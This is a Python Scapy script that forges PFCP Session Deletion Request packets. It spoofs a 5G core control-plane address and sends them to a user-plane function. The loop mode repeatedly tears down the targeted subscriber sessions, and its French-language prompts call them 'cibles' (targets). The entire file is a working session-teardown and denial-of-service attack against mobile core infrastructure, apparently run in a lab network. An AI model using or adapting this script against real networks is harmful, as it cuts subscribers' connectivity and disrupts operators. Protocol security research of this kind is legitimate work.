import sys
import time
import logging
import argparse
from scapy.all import send
from scapy.contrib.pfcp import PFCP, PFCPSessionDeletionRequest
from scapy.layers.inet import IP, UDP

PFCP_CP_IP = "10.10.4.103"
PFCP_UP_IP = "10.10.4.3"

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
logger = logging.getLogger(__name__)

parser = argparse.ArgumentParser()
parser.add_argument("sessions", nargs="+", help="seid:seq:sport ...")
parser.add_argument("--duration", type=int, default=0)
parser.add_argument("--interval", type=int, default=5)
args = parser.parse_args()

sessions = []
for arg in args.sessions:
    parts = arg.split(":")
    sessions.append({"seid": int(parts[0], 16), "seq": int(parts[1]), "sport": int(parts[2])})

print(f"\n[+] {len(sessions)} sessions cibles :")
for s in sessions:
    print(f"    SEID={hex(s['seid'])}  SEQ={s['seq']}  sport={s['sport']}")
if args.duration > 0:
    print(f"[+] Mode boucle : duration={args.duration}s interval={args.interval}s")

input("\nAppuie sur Entree pour lancer les deletions...\n")

def send_deletions():
    for s in sessions:
        pkt = (IP(src=PFCP_CP_IP, dst=PFCP_UP_IP) /
               UDP(sport=s['sport'], dport=8805) /
               PFCP(version=1, S=1, seid=s['seid'], seq=s['seq']) /
               PFCPSessionDeletionRequest())
        send(pkt, verbose=0)
        logger.info(f"Session Deletion -> SEID={hex(s['seid'])} SEQ={s['seq']}")
        time.sleep(0.1)

if args.duration > 0:
    end_time = time.time() + args.duration
    iteration = 0
    while time.time() < end_time:
        iteration += 1
        logger.info(f"Iteration {iteration}")
        send_deletions()
        remaining = end_time - time.time()
        sleep_t = min(args.interval, remaining)
        if sleep_t > 0:
            time.sleep(sleep_t)
else:
    send_deletions()

print("\n[+] Toutes les sessions supprimees.")
